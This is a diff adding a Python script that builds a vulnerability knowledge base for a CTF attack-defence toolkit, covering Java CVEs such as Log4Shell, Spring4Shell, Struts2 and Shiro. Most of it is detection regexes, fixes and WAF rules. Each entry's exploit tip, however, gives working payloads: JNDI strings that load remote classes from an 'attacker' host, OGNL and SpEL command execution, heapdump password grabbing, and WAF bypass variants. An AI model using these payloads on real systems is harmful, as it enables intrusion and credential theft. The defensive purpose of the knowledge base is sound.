@@ -1,0 +1,810 @@
+import json, os
+OUT = "/Users/shu/ctf/ctf工具包/LingOps_v0.2_darwin_arm64/ext/tools/awdp-lib-extra"
+def R(rid,name,typ,pat,sev="high",pri=2,desc=""):
+    return {"rule_id":rid,"name":name,"type":typ,"pattern":pat,"severity":sev,"priority":pri,"description":desc}
+def T(name,cat,lang,sev,desc,danger,patterns,sources,rules,fast,secure,example,exlang,
+      summary,tip,waf,deps,wl,bl,fw,bypass,fp,tags,refs,framework=""):
+    return {"name":name,"category":cat,"language":lang,"framework":framework,"severity":sev,
+      "description":desc,"danger_functions":danger,"code_patterns":patterns,"input_sources":sources,
+      "match_rules":rules,"fix_fast_method":fast,"fix_secure_method":secure,"fix_code_example":example,
+      "fix_code_language":exlang,"fix_summary":summary,"exploit_tip":tip,"waf_template":waf,
+      "waf_dependencies":deps,"whitelist_rule":wl,"blacklist_rule":bl,"framework_fix":fw,
+      "bypass_methods":bypass,"false_positive":fp,"tags":tags,"references":refs}
+
+D=[]
+# ---------------- Java ----------------
+D.append(T("Spring4Shell 数据绑定 RCE（CVE-2022-22965）","rce","java","critical",
+ "Spring MVC 的 @ModelAttribute 数据绑定可写入 class.module.classLoader.* 属性，"
+ "攻击者改 Tomcat AccessLogValve 的 pattern/suffix 在 webroot 写 JSP webshell。",
+ ["@ModelAttribute","WebDataBinder","classLoader"],
+ ["@ModelAttribute","WebDataBinder","setDisallowedFields"],
+ ["请求参数 class.module.classLoader","POST body"],
+ [R("kbcve-22965-1","Spring 数据绑定未限制字段","regex",
+    r"@ModelAttribute[^\n]{0,80}(User|Form|Dto|Vo|Entity)\b","high",2,
+    "使用对象绑定接收请求参数，需确认无敏感属性暴露"),
+  R("kbcve-22965-2","classLoader 属性访问","keyword",r"class\.module\.classLoader","critical",1,
+    "请求中出现 class.module.classLoader 即攻击特征"),
+  R("kbcve-22965-3","旧版 Spring 依赖","regex",
+    r"spring-(webmvc|core|beans)</artifactId>\s*<version>5\.[0-3]\.[0-9]{1,2}<","high",2,
+    "Spring < 5.3.18 存在 CVE-2022-22965")],
+ "升级 Spring Framework ≥ 5.3.18 / ≥ 5.2.20。",
+ "@InitBinder 里 binder.setDisallowedFields(\"class.*\",\"Class.*\",\"*.class.*\");\n"
+ "或用 @RequestBody DTO（Jackson 反序列化不走 BeanWrapper）；升级 Tomcat ≥ 9.0.62。",
+ "@InitBinder\npublic void initBinder(WebDataBinder b) {\n"
+ "  b.setDisallowedFields(\"class.*\", \"Class.*\", \"*.class.*\", \"*.class\", \"*.classLoader.*\");\n}",
+ "java",
+ "Spring 参数绑定可写 classLoader 属性 → 写 JSP webshell。",
+ "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(...)\n"
+ "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp\n"
+ "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
+ "if (body matches 'class\\.module\\.classLoader'): block", "", "", "class.module.classLoader,pipeline.first",
+ "升级 Spring/Tomcat；@InitBinder 禁用 class.* 字段；WAF 拦截 class.module 关键字。",
+ ["参数名大小写混写 Class.module", "嵌套参数 obj.class.module", "分号拼接绕过 WAF"],
+ "误报：classLoader 出现在合法诊断代码中极少。",
+ "cve-2022-22965,spring,rce",
+ ["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"],framework="Spring MVC"))
+
+D.append(T("Spring Cloud Gateway Actuator SpEL RCE（CVE-2022-22947）","rce","java","critical",
+ "Actuator 端点暴露且 gateway 开启时，POST /actuator/gateway/routes 可注入 SpEL 表达式，"
+ "刷新路由后执行任意命令。",
+ ["Gateway","Actuator","SpEL"],
+ ["management.endpoints.web.exposure.include","gateway/routes","SpEL"],
+ ["/actuator/gateway/routes","POST JSON body"],
+ [R("kbcve-22947-1","Actuator 全端点暴露","regex",
+    r"management\.endpoints\.web\.exposure\.include\s*=\s*\\*","critical",1,"Actuator 暴露所有端点"),
+  R("kbcve-22947-2","gateway 路由管理开启","keyword",r"actuator/gateway","high",2,
+    "网关路由动态管理端点可被访问"),
+  R("kbcve-22947-3","SpEL 求值","regex",r"SpelExpressionParser|parseExpression\s*\(","high",2,
+    "代码使用 SpEL 解析表达式，需确认表达式来源")],
+ "management.endpoints.web.exposure.include=health,info（默认只开 health）。",
+ "升级 Spring Cloud Gateway ≥ 3.1.1 / 3.0.7；关闭 gateway actuator 端点并加认证；\n"
+ "Actuator 绑定 management.server.port 到内网端口。",
+ "management.endpoints.web.exposure.include=health\nmanagement.endpoint.gateway.enabled=false\n"
+ "management.server.port=18081",
+ "properties",
+ "Actuator + Gateway 组合可 SpEL 注入 RCE，关闭路由管理端点。",
+ "POST /actuator/gateway/routes/x\n{\"id\":\"x\",\"filters\":[{\"name\":\"AddResponseHeader\",\"args\":{\"name\":\"r\","
+ "\"value\":\"#{new String(T(java.lang.Runtime).getRuntime().exec('id').getInputStream().readAllBytes())}\"}}]}\n"
+ "POST /actuator/gateway/refresh",
+ "location ~ /actuator { deny all; }", "", "", "actuator/gateway,SpelExpressionParser",
+ "关闭 gateway actuator；升级版本；Actuator 端口内网化 + Basic Auth。",
+ ["/actuator/gateway/routes/ 尾部斜杠", "大小写 /Actuator/", "路径穿越 /actuator/../actuator"],
+ "误报：仅暴露 health 端点不构成风险。",
+ "cve-2022-22947,spring-cloud-gateway,spel,rce",
+ ["https://nvd.nist.gov/vuln/detail/CVE-2022-22947"],framework="Spring Cloud Gateway"))
+
+D.append(T("Spring Cloud Function SpEL RCE（CVE-2022-22963）","rce","java","critical",
+ "spring.cloud.function.routing-expression 请求头被当作 SpEL 求值，直接执行命令。",
+ ["functionRouter","routing-expression"],
+ ["routing-expression","spring.cloud.function"],
+ ["spring.cloud.function.routing-expression 头"],
+ [R("kbcve-22963-1","routing-expression 头出现","keyword",
+    r"spring\.cloud\.function\.routing-expression","critical",1,"攻击特征请求头"),
+  R("kbcve-22963-2","Spring Cloud Function 旧版","regex",
+    r"spring-cloud-function-(context|core)</artifactId>\s*<version>3\.[0-2]\.[0-8]<","high",2,
+    "版本 < 3.2.5 存在 CVE-2022-22963")],
+ "升级 spring-cloud-function ≥ 3.2.5 / 3.1.7。",
+ "升级并禁用函数路由（spring.cloud.function.definition 显式指定）；WAF 拦截该请求头。",
+ "spring.cloud.function.definition=myFunc",
+ "properties",
+ "functionRouter 把请求头当 SpEL，等于远程命令执行。",
+ "POST /functionRouter HTTP/1.1\nspring.cloud.function.routing-expression: "
+ "T(java.lang.Runtime).getRuntime().exec(\"id\")",
+ "if (header 'spring.cloud.function.routing-expression' present) block", "", "",
+ "routing-expression,functionRouter",
+ "升级；WAF 直接拒绝该请求头。",
+ ["头名大小写变体", "分块传输拆分头"],
+ "误报：无。",
+ "cve-2022-22963,spring-cloud-function,spel",
+ ["https://nvd.nist.gov/vuln/detail/CVE-2022-22963"],framework="Spring Cloud Function"))
+
+D.append(T("Spring Actuator 敏感端点未授权","info-leak","java","high",
+ "/actuator/env 泄露数据库口令与配置，/actuator/heapdump 下载堆内存（含 session 与密钥），"
+ "/actuator/httptrace 看请求，/actuator/jolokia 可打 MBean RCE。",
+ ["actuator","heapdump","env","jolokia"],
+ ["management.endpoints","actuator/env","actuator/heapdump"],
+ ["/actuator/*"],
+ [R("kbjava-act-1","Actuator 全开","regex",r"management\.endpoints\.web\.exposure\.include\s*=\s*\\*","critical",1,
+    "暴露全部 Actuator 端点"),
+  R("kbjava-act-2","env/heapdump 暴露","keyword",r"actuator/(env|heapdump|jolokia|httptrace)","high",2,
+    "出现高危 Actuator 路径"),
+  R("kbjava-act-3","Actuator 无认证","regex",r"management\.security\.enabled\s*=\s*false","high",2,
+    "关闭 Actuator 安全管理")],
+ "management.endpoints.web.exposure.include=health",
+ "只开 health/info；management.server.port 绑内网并加 Spring Security Basic Auth；\n"
+ "heapdump 端点单独禁用：management.endpoint.heapdump.enabled=false。",
+ "management.endpoints.web.exposure.include=health,info\n"
+ "management.endpoint.heapdump.enabled=false\nmanagement.endpoint.env.enabled=false\n"
+ "management.server.port=18081",
+ "properties",
+ "Actuator 泄露配置与内存，是 Java 站最快拿凭据的入口。",
+ "curl http://t/actuator/env | jq '.propertySources[].properties'\n"
+ "curl -o heap.hprof http://t/actuator/heapdump\nstrings heap.hprof | grep -i password",
+ "location ~ ^/actuator/(env|heapdump|jolokia|beans|configprops|httptrace|mappings) { deny all; }",
+ "", "", "actuator/env,actuator/heapdump,jolokia",
+ "关闭高危端点；内网端口 + 认证；WAF 拦截 /actuator/ 高危路径。",
+ ["/actuator/env/ 尾斜杠", "大小写 /Actuator/env", "%2factuator%2fenv", "通过 X-Forwarded-Prefix 改写"],
+ "误报：仅 health 端点开放属正常。",
+ "actuator,info-leak,spring",
+ ["https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html"],framework="Spring Boot"))
+
+D.append(T("Struts2 OGNL 注入（S2-045/061/062/066）","rce","java","critical",
+ "Struts2 把 Content-Type、参数名等直接交给 OGNL 求值，"
+ "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...} 可执行命令。",
+ ["ognl","StrutsPrepareAndExecuteFilter","ActionContext"],
+ ["ognl","%{","Content-Type"],
+ ["Content-Type 头","请求参数名"],
+ [R("kbcve-struts-1","OGNL 求值入口","regex",r"%\{[^}]{0,80}(#_|@java\.lang|@ognl|getRuntime)","critical",1,
+    "请求/代码出现典型 OGNL 利用片段"),
+  R("kbcve-struts-2","Struts 旧版本依赖","regex",
+    r"struts2-core</artifactId>\s*<version>2\.[0-3]\.[0-9]{1,2}","high",2,"Struts2 < 2.5.33 存在多个 RCE"),
+  R("kbcve-struts-3","OGNL 工具类使用","keyword",r"Ognl\.getValue|OgnlUtil","high",3,
+    "代码直接使用 OGNL 求值，需审计表达式来源")],
+ "升级 Struts2 ≥ 2.5.33 / ≥ 6.3.0.2。",
+ "升级并开启 struts.allowed.action.names 白名单；WAF 拦截 Content-Type 中的 %{ 与 OGNL 关键字；\n"
+ "无法升级时在 web.xml 增加过滤器拦截 %{( 与 @java.lang.Runtime。",
+ "struts.allowed.action.names=[a-zA-Z0-9._!\\[\\]\\\\/]*",
+ "properties",
+ "Struts2 的 OGNL 求值是历史上最多次 RCE 的入口，必须升级。",
+ "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)"
+ ".(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])"
+ "...)(#cmd='id')}",
+ "if (Content-Type matches '%\\{' or 'ognl'): block", "", "", "ognl,%{,getRuntime",
+ "升级 Struts2；WAF 拦截 %{ 与 OGNL/Java Runtime 关键字。",
+ ["%{( 大小写", "Content-Type 加空格变形", "参数名注入 S2-061", "method: 前缀 S2-062"],
+ "误报：模板中 %{ 在 Struts 标签里合法，需看是否含 OGNL 危险调用。",
+ "struts2,ognl,rce",
+ ["https://cwiki.apache.org/confluence/display/WW/S2-045"],framework="Struts2"))
+
+D.append(T("Shiro rememberMe 反序列化（默认密钥）","deserialization","java","critical",
+ "Shiro 的 rememberMe cookie 用 AES 加密序列化数据，密钥硬编码在代码中（默认 kPH+bIxk5D2deZiIxcaaaA==），"
+ "拿到密钥即可用 CC 链打 RCE。",
+ ["CookieRememberMeManager","AbstractRememberMeManager","rememberMe"],
+ ["setCipherKey","rememberMe","CookieRememberMeManager"],
+ ["Cookie: rememberMe=deleteMe"],
+ [R("kbshiro-1","硬编码 rememberMe 密钥","regex",
+    r"setCipherKey\s*\(\s*Base64\.decode|kPH\+bIxk5D2deZiIxcaaaA","critical",1,"使用默认/硬编码 AES 密钥"),
+  R("kbshiro-2","rememberMe cookie 处理","keyword",r"rememberMe","medium",2,"存在 rememberMe 功能，需确认密钥"),
+  R("kbshiro-3","Shiro 旧版本","regex",r"shiro-(core|web)</artifactId>\s*<version>1\.[0-4]\.[0-9]","high",2,
+    "Shiro < 1.2.5 使用默认密钥")],
+ "在 shiro.ini / 配置类中随机生成 128bit 密钥并注入 CookieRememberMeManager。",
+ "升级 Shiro ≥ 1.2.5 并更换随机密钥；禁用 rememberMe（securityManager.setRememberMeManager(null)）；\n"
+ "WAF 拦截 rememberMe cookie 中的 base64 序列化数据（特征 rO0AB / 大长度）。",
+ "CookieRememberMeManager m = new CookieRememberMeManager();\n"
+ "m.setCipherKey(Base64.decode(System.getenv(\"SHIRO_KEY\"))); // 32 字节随机\n"
+ "securityManager.setRememberMeManager(m);",
+ "java",
+ "Shiro 默认密钥公开，rememberMe 等于反序列化后门。",
+ "python3 shiro_exploit.py -u http://t/ -k kPH+bIxk5D2deZiIxcaaaA== -c 'id'\n"
+ "# 或用 ysoserial 生成 CC 链后 AES 加密塞 cookie",
+ "if (cookie 'rememberMe' length > 1000 or contains 'rO0AB'): block", "", "",
+ "rememberMe,kPH+bIxk5D2deZiIxcaaaA,rO0AB",
+ "换随机密钥；关闭 rememberMe；WAF 检测超长 rememberMe cookie。",
+ ["删除 rememberMe 触发 deleteMe 判断版本", "GCM 模式密钥", "CC/Beanshell 多条 gadget 链"],
+ "误报：rememberMe 短值（正常登录令牌）不构成风险。",
+ "shiro,deserialization,rce,cve",
+ ["https://github.com/apache/shiro/security/advisories"],framework="Apache Shiro"))
+
+D.append(T("Log4j2 JNDI 注入（Log4Shell CVE-2021-44228）","rce","java","critical",
+ "Log4j2 在记录日志时解析 ${jndi:ldap://...}，加载远程 LDAP 返回的恶意类执行命令；"
+ "绕过方式包括 ${lower:}、${::-j}、${env:} 等嵌套写法。",
+ ["log4j","JndiLookup","InitialContext"],
+ ["${jndi:","log4j-core","JndiLookup"],
+ ["User-Agent","X-Api-Version","任何被记录的字段"],
+ [R("kbcve-44228-1","JNDI 注入特征","regex",
+    r"\$\{[^}]{0,40}(jndi|lower|upper|env|sys|date|::-)[^}]{0,80}(ldap|rmi|dns|http)","critical",1,
+    "日志/请求出现 Log4j 查找语法"),
+  R("kbcve-44228-2","旧版 log4j-core","regex",
+    r"log4j-core</artifactId>\s*<version>2\.(0|1[0-6])(\.[0-9]+)?<","critical",1,
+    "log4j-core < 2.17.1 存在 CVE-2021-44228/45046"),
+  R("kbcve-44228-3","JndiLookup 类存在","keyword",r"JndiLookup","high",2,
+    "classpath 含 JndiLookup，需确认版本")],
+ "升级 log4j-core ≥ 2.17.1；临时缓解 -Dlog4j2.formatMsgNoLookups=true。",
+ "升级到 ≥ 2.17.1（2.12.x 用 2.12.4）；删除 JndiLookup.class；\n"
+ "设置 log4j2.disable.jndi=true，并限制 JVM 出网（ldap/rmi/dns）。",
+ "// JVM 启动参数\n-Dlog4j2.formatMsgNoLookups=true -Dlog4j2.disable.jndi=true\n"
+ "// pom.xml\n<version>2.17.1</version>",
+ "xml",
+ "Log4j2 会把任何被记录的字符串当表达式求值，必须升级。",
+ "curl -H 'User-Agent: ${jndi:ldap://attacker/a}' http://t/\n"
+ "# 绕过: ${${lower:j}ndi:ldap://...}  ${jndi:${lower:l}dap://...}",
+ "if (body|headers matches '\\$\\{.*(jndi|ldap|rmi):'): block", "", "", "${jndi:,ldap://,rmi://",
+ "升级 2.17.1；关闭 lookup；WAF 拦截 ${jndi: 及嵌套变体。",
+ ["${lower:j}ndi", "${::-j}ndi", "${env:NaN:-j}ndi", "${${lower:j}${lower:n}di:ldap://}"],
+ "误报：日志模板中出现 ${...} 占位属正常，需含 jndi/ldap 关键字。",
+ "cve-2021-44228,log4j,jndi,rce",
+ ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],framework="Log4j2"))
+
+D.append(T("Fastjson autoType 反序列化","deserialization","java","critical",
+ "JSON.parse / parseObject 未关闭 autoType 时，{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",...} 触发 JNDI 加载远程类。",
+ ["JSON.parse","JSON.parseObject","ParserConfig"],
+ ["JSON.parse(","@type","autoTypeSupport"],
+ ["POST JSON body"],
+ [R("kbfastjson-1","@type 关键字","keyword",r"\"@type\"\s*:","critical",1,"JSON 中出现 @type，autoType 攻击特征"),
+  R("kbfastjson-2","JSON.parse 直接解析请求体","regex",
+    r"JSON\.(parse|parseObject)\s*\(\s*(request|body|input|json|str)","high",2,
+    "直接解析外部 JSON，需确认 autoType 已关闭"),
+  R("kbfastjson-3","开启 autoType","regex",r"setAutoTypeSupport\s*\(\s*true|autoTypeSupport\s*=\s*true","critical",1,
+    "显式开启 autoType")],
+ "升级 fastjson ≥ 1.2.83；开启 safeMode。",
+ "ParserConfig.getGlobalInstance().setSafeMode(true);\n"
+ "并升级到 fastjson2（com.alibaba.fastjson2），彻底移除 autoType 风险。",
+ "ParserConfig.getGlobalInstance().setSafeMode(true);\n"
+ "// 或改用 fastjson2\nObject o = JSON.parseObject(body, User.class);",
+ "java",
+ "Fastjson 的 @type 可指定任意类并触发 JNDI，必须开 safeMode。",
+ "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/a\","
+ "\"autoCommit\":true}\n# 1.2.68 之后需配合 ExpectClass 绕过",
+ "if (body contains '\"@type\"'): block", "", "", "@type,autoTypeSupport,JdbcRowSetImpl",
+ "升级 fastjson2 / 开 safeMode；WAF 拦截 @type 与 JdbcRowSetImpl。",
+ ["@type 加空格 \"@type \"", "\\u0040type", "Lcom.sun.rowset.JdbcRowSetImpl;", "嵌套 [{ }] 数组"],
+ "误报：业务 JSON 极少使用 @type 字段。",
+ "fastjson,deserialization,rce",
+ ["https://github.com/alibaba/fastjson/wiki/security_update_20220523"],framework="Fastjson"))
+
+D.append(T("Jackson enableDefaultTyping 反序列化","deserialization","java","high",
+ "开启 enableDefaultTyping / activateDefaultTyping 后，JSON 里的 [\"com.evil.Class\",{...}] 会实例化任意类，"
+ "配合 JNDI 或 gadget 链 RCE。",
+ ["ObjectMapper","enableDefaultTyping","activateDefaultTyping"],
+ ["enableDefaultTyping","activateDefaultTyping","@JsonTypeInfo"],
+ ["POST JSON body"],
+ [R("kbjackson-1","开启默认类型","regex",r"(enableDefaultTyping|activateDefaultTyping)\s*\(","critical",1,
+    "开启多态反序列化"),
+  R("kbjackson-2","readValue 解析外部数据","regex",
+    r"readValue\s*\(\s*(request|body|input|json)","high",2,"直接反序列化外部 JSON"),
+  R("kbjackson-3","版本过低","regex",r"jackson-databind</artifactId>\s*<version>2\.(8|9|1[0-2])","high",3,
+    "jackson-databind < 2.13 存在多条 gadget")],
+ "移除 enableDefaultTyping；用 @JsonTypeInfo + 白名单子类。",
+ "使用 Jackson 的 PolymorphicTypeValidator 白名单；升级 jackson-databind ≥ 2.13.4；\n"
+ "禁用 DefaultTyping 并关闭 FAIL_ON_UNKNOWN_PROPERTIES 之外的宽松配置。",
+ "PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()\n"
+ "    .allowIfSubType(\"com.myapp.dto.\").build();\n"
+ "mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);",
+ "java",
+ "Jackson 多态反序列化等于任意类实例化，必须白名单。",
+ "[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://attacker/a\",\"autoCommit\":true}]",
+ "if (body matches '^\\[\"com\\.|\\[\"org\\.'): block", "", "", "enableDefaultTyping,@JsonTypeInfo",
+ "去掉 DefaultTyping；白名单 PolymorphicTypeValidator；升级版本。",
+ ["数组形式 [\"类名\",{}]", "对象形式 {\"@class\":\"...\"}", "大小写与空白变形"],
+ "误报：显式 @JsonTypeInfo(use=NAME) 且子类受限属安全用法。",
+ "jackson,deserialization,rce",
+ ["https://github.com/FasterXML/jackson-databind/issues"],framework="Jackson"))
+
+D.append(T("Tomcat AJP 文件读取 / 部分 PUT RCE（CVE-2020-1938 / CVE-2025-24813）","lfi","java","high",
+ "Ghostcat：AJP 8009 端口未加 secret 时，可读 webapp 下任意文件甚至包含 JSP 执行；"
+ "CVE-2025-24813：DefaultServlet 写入（readonly=false）+ 部分 PUT 可 RCE。",
+ ["AjpProcessor","DefaultServlet","AJP"],
+ ["Connector port=\"8009\"","readonly=","AJP"],
+ ["8009/tcp","PUT 请求"],
+ [R("kbcve-1938-1","AJP 连接器暴露","regex",r"<Connector[^>]*port=\"8009\"","high",1,"开启 AJP 连接器"),
+  R("kbcve-1938-2","AJP secret 缺失","keyword",r"secretRequired|requiredSecret","medium",2,
+    "AJP 未配置 secret，可被任意来源连接"),
+  R("kbcve-24813-1","DefaultServlet readonly 关闭","regex",r"readonly\s*=\s*\"?false","high",2,
+    "DefaultServlet 允许写，配合 partial PUT 可 RCE")],
+ "注释掉 8009 连接器；readonly 保持默认 true。",
+ "升级 Tomcat ≥ 9.0.99 / 10.1.35 / 11.0.3；AJP 必须设置 secretRequired=true 与 secret；\n"
+ "只监听 127.0.0.1 并关闭 allowTrace。",
+ "<!-- 关闭 AJP -->\n<!-- <Connector port=\"8009\" protocol=\"AJP/1.3\" /> -->\n"
+ "<Connector port=\"8080\" protocol=\"HTTP/1.1\" address=\"127.0.0.1\" allowTrace=\"false\" />",
+ "xml",
+ "AJP 暴露可读任意 webapp 文件；DefaultServlet 可写则升级为 RCE。",
+ "python3 CNVD-2020-10487-Tomcat-Ajp-lfi.py t -p 8009 -f WEB-INF/web.xml\n"
+ "# CVE-2025-24813: PUT /x.txt/  + 会话文件包含",
+ "location ~ :8009 { deny all; }", "", "", "8009,ajp13,readonly=false",
+ "关闭 AJP；升级 Tomcat；readonly=true；防火墙阻断 8009。",
+ ["AJP 包中 attribute 伪造 javax.servlet.include", "部分 PUT 覆盖 session 文件"],
+ "误报：仅当配置中显式开启 AJP 或 readonly=false 时告警。",
+ "cve-2020-1938,cve-2025-24813,tomcat,ajp,lfi",
+ ["https://nvd.nist.gov/vuln/detail/CVE-2020-1938"],framework="Tomcat"))
+
+D.append(T("WebLogic T3/IIOP 反序列化","deserialization","java","critical",
+ "WebLogic 的 T3 协议接收序列化对象，配合 CC 链或 WebLogic 自带 gadget 可未授权 RCE（CVE-2023-21839、CVE-2023-22527 等）。",
+ ["T3","IIOP","t3://"],
+ ["t3://","7001","wlserver"],
+ ["7001/tcp","T3 握手"],
+ [R("kbweblogic-1","T3 协议特征","keyword",r"t3://|T3Protocol|weblogic\.rjvm","high",2,
+    "出现 WebLogic T3 协议使用"),
+  R("kbweblogic-2","WebLogic 旧版本","regex",r"weblogic[^\n]{0,40}(10\.3|12\.1\.3|12\.2\.1)","high",3,
+    "WebLogic 旧版本存在多个反序列化 RCE")],
+ "升级 WebLogic 到最新 CPU 补丁；关闭 T3/IIOP 或加连接筛选器。",
+ "在 WebLogic 控制台配置连接筛选器只允许信任 IP；禁用 T3 协议（weblogic.security.net.ConnectionFilterImpl）；\n"
+ "升级至 2024 年 1 月及以后的 CPU。",
+ "weblogic.security.net.ConnectionFilterImpl\n* * 7001 deny\n10.0.0.0/8 * 7001 allow",
+ "text",
+ "WebLogic T3 未授权反序列化是稳定 RCE 路径，必须打补丁或封端口。",
+ "java -jar Weblogic-CVE-2023-21839.jar -ip t -port 7001 -ldap ldap://attacker/a",
+ "if (port 7001 reachable) { restrict }", "", "", "t3://,7001,IIOP",
+ "打 CPU 补丁；连接筛选器限制来源；不暴露 7001。",
+ ["IIOP 代替 T3", "T3 协议降级", "通过 HTTP 隧道打 T3"],
+ "误报：仅当服务确实是 WebLogic 且版本落后时告警。",
+ "weblogic,t3,deserialization,rce",
+ ["https://nvd.nist.gov/vuln/detail/CVE-2023-21839"],framework="WebLogic"))
+
+D.append(T("Java JNDI 注入（lookup 来源可控）","rce","java","high",
+ "InitialContext.lookup(userInput) 会让客户端连接任意 LDAP/RMI 服务，加载远程 Reference 类执行代码；"
+ "JDK 8u191+ 默认关闭远程 codebase 但本地 gadget 仍可用。",
+ ["InitialContext","lookup","Context"],
+ ["InitialContext","lookup(","jndi:"],
+ ["请求参数","配置项"],
+ [R("kbjndi-1","lookup 使用变量","regex",r"\.lookup\s*\(\s*[a-z_]\w*\s*\)","high",1,
+    "lookup 参数为变量，需确认来源"),
+  R("kbjndi-2","jndi 协议前缀","keyword",r"jndi:(ldap|rmi|dns|iiop)","medium",2,"出现 jndi 协议字符串"),
+  R("kbjndi-3","lookup 拼接请求","regex",r"\.lookup\s*\(\s*(request|req\.|param)","critical",1,
+    "lookup 直接使用请求参数")],
+ "lookup 参数改为白名单常量或服务端配置。",
+ "禁止用户输入进入 lookup；必须远程查找时限制协议为 ldaps 并校验返回的 Reference 类名白名单；\n"
+ "升级 JDK（com.sun.jndi.ldap.object.trustURLCodebase=false）。",
+ "private static final String DS = \"ldaps://dir.internal:636\";\nContext ctx = new InitialContext(env);\n"
+ "Object o = ctx.lookup(DS + \"/cn=\" + sanitize(cn));",
+ "java",
+ "JNDI lookup 接受外部输入即可被指向恶意 LDAP 服务。",
+ "?name=ldap://attacker:1389/Exploit\n# 返回 Reference 指向 http://attacker/Exploit.class",
+ "if (param matches '^(ldap|rmi|dns|iiop)://'): block", "", "", "jndi:,ldap://,rmi://",
+ "白名单常量；禁用 trustURLCodebase；WAF 拦截 jndi 协议串。",
+ ["ldap:// 大小写", "ldaps:// 绕过", "dns:// 外带数据"],
+ "误报：lookup 使用常量 DN 属正常。",
+ "jndi,injection,rce,java",
+ ["https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf"] ))
+
+D.append(T("SpEL 表达式注入（通用）","rce","java","critical",
+ "SpelExpressionParser.parseExpression(userInput).getValue() 可直接调用 T(java.lang.Runtime) 执行命令；"
+ "常见于规则引擎、报表、权限表达式、@Value 动态求值。",
+ ["SpelExpressionParser","ExpressionParser","parseExpression"],
+ ["SpelExpressionParser","parseExpression(","getValue("],
+ ["请求参数","规则配置"],
+ [R("kbspel-1","SpEL 解析变量","regex",r"parseExpression\s*\(\s*[a-z_]\w*","high",1,
+    "表达式来自变量，需确认是否可信"),
+  R("kbspel-2","SpEL 危险调用","keyword",r"T\(java\.lang\.(Runtime|ProcessBuilder)","critical",1,
+    "表达式含 Runtime/ProcessBuilder 调用"),
+  R("kbspel-3","SimpleEvaluationContext 缺失","keyword",r"StandardEvaluationContext","medium",3,
+    "使用标准求值上下文（可调用任意方法），应改 SimpleEvaluationContext")],
+ "用 SimpleEvaluationContext.forReadOnlyDataBinding() 限制求值能力。",
+ "禁止把用户输入当 SpEL；必须动态求值时用 SimpleEvaluationContext 并只暴露白名单方法/属性。",
+ "ExpressionParser p = new SpelExpressionParser();\n"
+ "EvaluationContext ctx = SimpleEvaluationContext.forReadOnlyDataBinding().build();\n"
+ "Object v = p.parseExpression(\"#user.name\").getValue(ctx, root);",
+ "java",
+ "SpEL 标准上下文可调用任意静态方法，等于 RCE。",
+ "#{T(java.lang.Runtime).getRuntime().exec('id')}\n#{new java.util.Scanner(T(java.lang.Runtime)"
+ ".getRuntime().exec('id').getInputStream()).next()}",
+ "if (body matches 'T\\(java\\.lang\\.(Runtime|ProcessBuilder)|\\.exec\\('): block", "", "",
+ "T(java.lang.Runtime),SpelExpressionParser",
+ "改 SimpleEvaluationContext；WAF 拦截 T(java.lang.Runtime)。",
+ ["T (java.lang.Runtime) 加空格", "反射调用 Class.forName", "ProcessBuilder 替代 Runtime"],
+ "误报：SpEL 表达式为常量模板时无风险。",
+ "spel,injection,rce,java",
+ ["https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html"] ))
+
+D.append(T("Spring UriComponentsBuilder 开放重定向（CVE-2024-22243）","open-redirect","java","medium",
+ "UriComponentsBuilder.fromUriString(userUrl) 对恶意 URL 解析不一致，"
+ "可构造 https://evil.com\\@good.com 使校验通过但跳转到 evil.com。",
+ ["UriComponentsBuilder","fromUriString","redirect:"],
+ ["UriComponentsBuilder","sendRedirect","redirect:"],
+ ["请求参数 url/next/redirect"],
+ [R("kbcve-22243-1","fromUriString 使用外部输入","regex",
+    r"UriComponentsBuilder\.from(UriString|HttpUrl)\s*\(\s*[a-z_]\w*","high",1,
+    "URL 由变量构造，需确认来源"),
+  R("kbcve-22243-2","sendRedirect 使用请求参数","regex",
+    r"sendRedirect\s*\(\s*(request\.getParameter|url|redirect)","high",1,"重定向目标来自请求"),
+  R("kbcve-22243-3","Spring 旧版本","regex",r"spring-web</artifactId>\s*<version>6\.0\.[0-9]<","high",3,
+    "Spring 6.0.x < 6.0.17 存在 CVE-2024-22243")],
+ "升级 Spring Framework ≥ 6.1.4 / 5.3.32；重定向只允许站内相对路径。",
+ "用 UriComponentsBuilder.fromPath() 构造站内跳转；对外部 URL 做严格白名单（scheme+host 完全匹配）。",
+ "String next = req.getParameter(\"next\");\nif (next == null || !next.matches(\"^/[\\\\w\\\\-/]*$\")) next = \"/\";\n"
+ "resp.sendRedirect(next);",
+ "java",
+ "URL 解析不一致导致白名单绕过，重定向必须限定站内相对路径。",
+ "/jump?url=https://evil.com\\@good.com\n/jump?url=https://good.com.evil.com",
+ "if (param matches '^https?://'): block", "", "", "fromUriString,sendRedirect",
+ "升级 Spring；只允许相对路径；WAF 拦截 URL 中的 \\@ 与 @。",
+ ["https://evil.com\\@good.com", "//evil.com", "https:evil.com", "URL 编码 @ 为 %40"],
+ "误报：重定向到固定常量无风险。",
+ "cve-2024-22243,open-redirect,spring",
+ ["https://nvd.nist.gov/vuln/detail/CVE-2024-22243"],framework="Spring"))
+
+# ---------------- Node ----------------
+D.append(T("Node.js 模板引擎 SSTI（EJS / Handlebars / Pug）","ssti","nodejs","critical",
+ "ejs.render(userInput)、Handlebars.compile(userInput) 会把用户输入当模板执行；"
+ "EJS 可用 <%= global.process.mainModule.require('child_process').execSync('id') %> 直接 RCE。",
